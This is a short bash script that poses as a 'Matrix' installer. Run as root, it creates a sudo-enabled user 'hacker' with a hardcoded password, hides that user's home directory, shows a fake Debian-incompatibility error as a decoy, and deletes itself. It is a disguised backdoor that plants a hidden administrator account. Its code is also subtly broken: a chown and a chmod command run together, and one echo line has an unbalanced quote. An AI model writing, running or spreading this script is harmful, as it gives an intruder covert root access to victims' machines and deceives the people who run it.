#!/bin/bash


if [[ $EUID -ne 0 ]]; then
  echo "BASH SHELL> This script must be run as root (or with sudo)."
  exit 1
fi 

# Create the user "hacker" with the password "hackerpass"
useradd -m -p "$(openssl passwd -1 hackerpass)" hacker

# Give the user "hacker" sudo permissions
usermod -aG sudo hacker 

# Rename the home directory by putting a "." in front of its name
mv /home/hacker /home/.hacker 

# Set the home directory permissions to be only accessible to the user "hacker" and the root user
chown -R hacker:root /home/.hackerchmod 750 /home/.hacker 

# Set the default user shell to bash (when logged in)
chsh -s /bin/bash hacker

echo "Error: The Debian version that you are using is"
echo 'not compatible with Matrix 1.0.
echo "To download matrix 2.0, use"
echo 'sudo apt-get install cmatrix'

# Delete this script
rm -- "$0"
